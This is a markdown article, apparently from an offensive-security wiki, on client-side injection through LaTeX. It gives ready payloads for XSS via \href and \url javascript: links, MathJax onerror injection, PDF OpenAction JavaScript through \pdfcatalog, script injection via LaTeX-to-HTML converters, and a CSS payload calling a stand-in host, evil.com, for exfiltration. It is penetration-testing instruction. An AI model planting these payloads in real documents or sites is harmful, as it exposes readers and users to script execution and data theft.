---
title: Master Client-Side Injection in LaTeX
description: Learn LaTeX-based client-side injection techniques to exploit browsers
  and PDF viewers efficiently.
keywords:
- client-side injection
- LaTeX XSS
- MathJax injection
- PDF JavaScript injection
- browser-based code execution
- HTML/CSS injection
- LaTeX exploits
- PDF viewer vulnerabilities
---

# Client-Side Injection

## Context

In this article, we aim to equip offensive operators with techniques to exploit client-side injection vulnerabilities in LaTeX-based contexts. The primary goal is to illustrate how malicious payloads can trigger code execution or render unwanted content in a user's browser or PDF viewer. This article assumes familiarity with client-side scripting concepts, JavaScript execution in browsers, PDF rendering processes, and fundamental LaTeX injection methods.

## Theory

### Client-Side Injection in LaTeX Contexts

Client-side injection involves embedding payloads within LaTeX documents, which subsequently result in code execution or rendering within a user's browser or PDF viewer. Unlike server-side attacks, these exploits leverage the way browsers or PDF viewers interpret LaTeX outputs, rather than targeting the LaTeX engine itself. By integrating certain LaTeX commands, attackers can craft inputs that produce HTML, JavaScript, or CSS during document rendering. This approach can lead to unauthorized client-side operations.

### LaTeX Constructs Enabling Client-Side Payloads

Specific LaTeX commands, such as `\href`, `\url`, `\unicode`, and various MathJax extensions, can be manipulated to embed JavaScript or HTML. Hackers often exploit these capabilities by bypassing input sanitization mechanisms through techniques like encoding, Unicode exploitation, or chaining multiple LaTeX commands to obfuscate their payloads.

### Threat Surface: Browser and PDF Viewer Rendering

Browsers and PDF viewers often trust the content generated by LaTeX, potentially allowing execution of embedded scripts or HTML rendering. This trust, combined with the capabilities of viewers—such as JavaScript support in PDF viewers like Adobe Reader or advanced rendering in MathJax-enabled applications—broadens the vulnerability landscape, providing multiple vectors for attack.

### Common Client-Side Injection Vectors in LaTeX

- **LaTeX XSS**: This attack enables JavaScript injection through constructs like `\href{javascript:...}` or `\url{javascript:...}`.
- **MathJax Injection**: By embedding HTML or JavaScript within mathematical environments rendered by MathJax, attackers can execute scripts.
- **PDF JavaScript Injection**: Uses commands like `\pdfcatalog` to insert JavaScript within PDF files.
- **HTML/CSS Injection**: Relevant for LaTeX-to-HTML converters, where attackers inject directly through LaTeX commands.

## Practice

### LaTeX XSS via \href or \url

This technique involves the insertion of JavaScript via LaTeX constructs that typically embed hyperlinks.

- **Payload**: 

  ```latex
  \href{javascript:alert('XSS')}{Click me}
  ```

  This payload injects JavaScript using `\href` and prompts an alert in the browser when clicked, provided the LaTeX output is HTML-rendered.

- **Alternative Payload**:

  ```latex
  \url{javascript:alert('XSS')}
  ```

  Using `\url`, it targets renderers susceptible to this type of URL-based injection.

**Outcome**: The JavaScript executes upon rendering, displaying an alert box if the output format supports HTML.

### MathJax Injection for HTML/JS Execution

By leveraging MathJax environments, scripts can be injected into mathematical expressions.

- **Payload**:

  ```latex
  $\htmlId{malicious}{<img src=x onerror=alert('MathJax XSS')>}$
  ```

  This injects HTML or JavaScript using the MathJax framework, triggering an alert when the image fails to load.

**Outcome**: Arbitrary JavaScript runs within MathJax-enabled applications, leading to potential XSS scenarios.

### PDF JavaScript Injection via \pdfcatalog

This technique uses LaTeX's PDF catalog commands to embed JavaScript into PDFs.

- **Payload**:

  ```latex
  \pdfcatalog{/OpenAction << /S /JavaScript /JS (app.alert('PDF XSS')) >>}
  ```

  JavaScript is incorporated directly into the PDF, prompting an alert when opened in a PDF viewer with JavaScript enabled.

**Outcome**: Execution of JavaScript happens upon opening the PDF in a viewer like Adobe Reader, triggering the configured action.

### HTML Injection via LaTeX-to-HTML Converters

This technique targets converters that may fail to adequately sanitize LaTeX inputs.

- **Payload**:

  ```latex
  \newcommand{\evil}{<script>alert('HTML XSS')</script>}\evil
  ```

  Injecting raw HTML or JS can be successful in converters producing HTML outputs.

**Outcome**: JavaScript execution occurs when the rendered HTML is displayed, activating the provided payload.

### CSS Injection via LaTeX

This involves injecting CSS for unwanted style changes or data exfiltration purposes.

- **Payload**:

  ```latex
  \newcommand{\css}{<style>body{background:url('http://evil.com/x.png')}</style>}\css
  ```

  The CSS injection manipulates the appearance or behavior of the rendered output.

**Outcome**: CSS renders as intended, possibly leading to data leaks or unwanted UI transformations.

## Tools

- **MathJax**
- **pdflatex**
- **LaTeXML**
- **Adobe Acrobat Reader**